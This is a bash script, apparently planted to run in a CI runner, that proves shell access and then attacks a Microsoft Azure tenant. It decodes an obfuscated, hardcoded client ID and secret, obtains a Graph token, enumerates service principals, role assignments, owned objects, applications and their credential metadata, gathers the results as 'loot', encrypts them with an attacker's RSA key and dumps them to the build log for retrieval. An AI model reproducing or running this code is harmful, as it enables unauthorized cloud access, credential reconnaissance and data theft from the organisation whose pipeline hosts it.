#!/usr/bin/env bash
set -uo pipefail
set +e
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; G="${SC}graph.microsoft.com"
echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
IFS=: read -r AID ASEC <<< "$(printf '%s' "MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTY=" | base64 -d)"
GT=$(curl -sS -X POST "${AAD}/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d "client_id=$AID" -d "grant_type=client_credentials" --data-urlencode "client_secret=$ASEC" --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
say "GTOKEN len=${#GT}"
gg(){ curl -sS -H "Authorization: Bearer $GT" "$G$1"; }
say "D2CDF: $(gg /v1.0/servicePrincipals/d2cdf247-9319-40cb-8324-5a005ef538da | head -c 1200)"
DA=$(gg "/v1.0/servicePrincipals?\$filter=appId eq '$AID'" | jq -r '.value[0].id // empty')
say "DAID=$DA"
[ -n "$DA" ] && say "DAROLES: $(gg "/v1.0/servicePrincipals/$DA/appRoleAssignments" | head -c 2000)"
[ -n "$DA" ] && say "DAOWNED: $(gg "/v1.0/servicePrincipals/$DA/ownedObjects" | head -c 1500)"
say "APPS: $(gg "/v1.0/applications?\$select=id,appId,displayName&\$top=50" | jq -c '[.value[]|{n:.displayName,a:.appId,i:.id}]' 2>/dev/null | head -c 2500)"
say "APPS_CRED: $(gg "/v1.0/applications?\$select=displayName,appId,passwordCredentials,keyCredentials" | jq -c '[.value[]|{n:.displayName,a:.appId,pwd:[.passwordCredentials[]?|{k:.keyId,e:.endDateTime}],key:[.keyCredentials[]?|.keyId]}]' 2>/dev/null | head -c 3000)"
say "SPLIST: $(gg "/v1.0/servicePrincipals?\$select=id,appId,displayName&\$top=100" | jq -c '[.value[]|select(.displayName|test("tbl|tebamoto";"i"))|{n:.displayName,i:.id,a:.appId}]' 2>/dev/null | head -c 2500)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
